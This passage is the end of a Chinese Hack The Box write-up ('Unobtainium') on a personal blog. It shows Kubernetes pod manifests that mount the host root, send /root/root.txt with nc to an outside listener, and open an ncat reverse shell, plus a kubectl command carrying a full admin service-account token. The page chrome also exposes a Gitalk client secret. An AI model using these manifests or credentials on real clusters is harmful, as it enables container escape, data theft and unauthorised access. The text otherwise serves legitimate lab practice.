+      args: [&quot;-c&quot;, &#39;cat /root/root.txt | nc -nv 10.10.14.53 6666; sleep 100000&#39;]
+      volumeMounts:
+      - mountPath: /root/
+        name: root-flag
+  volumes:
+  - hostPath:
+      path: /root/
+      type: &quot;&quot;
+    name: root-flag
+</code></pre>
+<p>然后本地监听一个端口，并保存文件为<code>root.txt</code></p>
+<pre><code class="Plain">nc -nvlp 6666 &gt; root.txt
+</code></pre>
+<p>然后运行该脚本</p>
+<pre><code class="Plain">/tmp/kubectl-lucifiel create -f /tmp/lucifiel.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# cat root.txt
+fd72e8e095033f233d31c383e5c0391b
+</code></pre>
+<p>成功拿到root权限的flag文件 ## 题外话 这几天事情有点多，再加上一些这样那样的情况吧，导致比较忙。所以这次的靶场就没有写的非常细致，有很多东西都是一下就略过了，请大家见谅。等过段时间忙完了就会恢复质量。</p>
+<p>最后一步如果想要获得一个shell，就使用这个脚本</p>
+<pre><code class="Plain">apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-revshell-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: raesene/ncat
+    command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ]
+    args: [ &quot;ncat --ssl $HOST $PORT -e /bin/bash;&quot; ]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+</code></pre>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/&title=《Unobtainium - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/&title=《Unobtainium - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Unobtainium - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/07/17/Hackthebox/Hackthebox-Cap/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Cap - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/07/12/Hackthebox/Hackthebox-Seal/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Seal - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/&title=《Unobtainium - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/&title=《Unobtainium - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Unobtainium - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACp0lEQVR42u3aQYpjMQwFwNz/0j0w60nynmSnM1BeBZr8r3KDrUh6POL183e9/uuzlT8hefLjxsLDw8Mbhb4JLgn32dN+gtV+Cw8PD+8zvNchPgs3ObKTzcoxecx4eHh438DLX5mkyLM34uHh4f1fvPZzi5nFgIeHh/dbvKQQkKfCOXWWuF+pteDh4eHFvLYs+w2fL/b38PDw8BZd9dnhmx/Qry+JAxHi4eHhXeC1Ae3P3nYAqy0fr/YbDw8Pb5SLJtfA7NBvCxNtPBEYDw8P7yivHXtqG12zcYFZwTe6/fDw8PAWvLxllbfH8kO/jSTfDjw8PLwbvP1Q1CaZbtPutkiBh4eH91u8fVO/3aZZg+0fb8HDw8O7xstT3hYzuypmxdx6X/Hw8PAWvFPNqrb9f6PxNrz38PDw8MqKQTuEmo9V5VfLvv02LEng4eHhHeLtMZsnzIrLT7+Lh4eHd5S3KeDmgwWrUmyQpr/5v+Hh4eEd5bUJdLspbRl3NkCQ/zDAw8PDO8Vrf/a3L253ejOs8Ob2w8PDw1vzZm2nYSMqTtzzS+LNxuHh4eFd5rXh5huxuU7yjR529vDw8PAu8GbFiLyV1a6CjYeHh/cR3qZ91V4k+RE/S7Xx8PDwbvA2ra9Z+2pfdMijwsPDw7vN22P2R/zs2ogWHh4e3lFeOxQ1K84mm9UOLkQWPDw8vGu8JKBN2yzZoHb4AA8PD+/zvFnzaZ8oz47+Nh48PDy8G7zZgTsrTGzKH/nIVw3Dw8PDG/H2xYX8uN8kzW0JAw8PD+82Lx+Zygez9tfDqsqCh4eH9zW8PLHOy7Wv39JeEnh4eHjfw5uVBjaFjKTo8Gb78PDw8K7x8qZXXkJtR7XawYIi18bDw8M7yts3wGatrDZdXhVz8fDw8M7w/gBoM3OotaBzqgAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
